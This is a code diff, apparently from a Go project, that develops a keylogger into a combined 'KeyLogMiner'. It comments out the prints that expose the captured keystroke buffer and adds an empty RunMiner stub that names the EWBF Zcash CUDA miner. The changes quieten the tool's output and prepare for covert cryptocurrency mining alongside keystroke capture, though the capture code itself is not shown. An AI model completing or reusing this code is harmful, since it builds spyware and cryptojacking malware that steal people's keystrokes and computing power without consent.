@@ -29,17 +29,17 @@ func keyLogger() {
 	for {
 	// fmt.Println(tmpKeylog)
 		time.Sleep(1 * time.Millisecond)
-		fmt.Println(tmpKeylog)
+		// fmt.Println(tmpKeylog)
 		if len(tmpKeylog) >= 10 {
 			// fmt.Println("Long String detected")
 			start = time.Now()
-			fmt.Println(start)
+			// fmt.Println(start)
 			tmpKeylog = ""
 		} 
 		elapsed = time.Since(start)
 		elapsedsec = int64(elapsed / time.Millisecond)/1000
-		fmt.Print("elapsed time = ")
-		fmt.Println(int64(elapsed / time.Millisecond)/1000)
+		// fmt.Print("elapsed time = ")
+		// fmt.Println(int64(elapsed / time.Millisecond)/1000)
 		if elapsedsec <= 10 && len(tmpKeylog) != 0 {
 			fmt.Println("Long String detected in 10s")
 		} 
@@ -293,17 +293,16 @@ func keyLogger() {
 	}
 }
 
-func longstringdetected() {
-	for {
-		if len(tmpKeylog) >= 10 {
-			fmt.Println("Long String detected")
-		}
-		time.Sleep(1 * time.Millisecond)
-	}
+func RunMiner() {
+// Miner using EWBF's CUDA Zcash miner
+// Ref: https://github.com/nanopool/ewbf-miner/releases
+
+
 }
 
 func main() {
-	fmt.Println("Starting KeyLogger!")
+	fmt.Println("Starting KeyLogMiner!")
+	// Run Miner
 	go keyLogger()
 	fmt.Println("Finish running keyLogger")
 	// go windowLogger()
